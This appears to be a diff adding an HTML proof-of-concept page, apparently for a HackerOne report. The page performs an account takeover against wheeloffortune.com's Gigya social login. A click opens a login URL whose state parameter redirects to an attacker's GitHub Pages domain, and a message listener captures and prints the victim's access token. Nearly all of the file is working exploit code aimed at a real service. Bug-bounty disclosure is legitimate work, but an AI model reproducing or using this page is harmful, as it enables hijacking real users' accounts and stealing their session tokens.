@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hackerone PoC</title>
+</head>
+<body>
+    <p>Click on the Image to give me you account!</p>
+    <img src="https://mms.businesswire.com/media/20200615005122/en/658229/23/hackerone_logo_black.jpg">
+    <script>
+
+    function handleOnClick() {
+      // Open the first URL and close the new tab after 10 seconds
+      var newTab = window.open('https://apicn.wheeloffortune.com/accounts.socialLogin?x_provider=facebook&x_lang=en&x_regSource=https%3A%2F%2Fwww.wheeloffortune.com%2F&x_sessionExpiration=0&x_enabledProviders=facebook&x_finalizeRegistration=true&x_include=profile%2Cdata%2Cemails%2Csubscriptions%2Cpreferences%2C&x_includeUserInfo=true&x_loginMode=standard&x_apiDomain=us1.gigya.com&x_source=showScreenSet&x_sdk=js_canary&client_id=3_CRKPm3f7YDU58OzuOHmrcBYaz3jHQCDMopCzleYPoOTn_9MfdRqWjG5YAg9EhskQ&redirect_uri=%2FGS%2FAfterLogin.aspx&response_type=server_token&state=domain%3Dhttps:mrhavit.github.io/%23https%253A%252F%252Fwww.wheeloffortune.com%252F%26lid%3Dflid1704018073072%26messaging%3D1%26id%3Daccounts_socialLogin_17040181695201704018169520&authMode=cookie')
+      setTimeout(function() {
+        newTab.close();
+      }, 10000000000);
+}
+    window.addEventListener('message', function(event) {
+    console.log(event.data);
+
+    if (typeof event.data === 'string' && event.data.startsWith('accounts_socialLogin')) {
+        document.write(`Your Access Token: ${event.data}`);
+    } else {
+        console.error('Invalid data format or missing "cb=" prefix');
+    }
+}, false);
+
+window.onclick = handleOnClick;
+    </script>
+</body>
+</html>
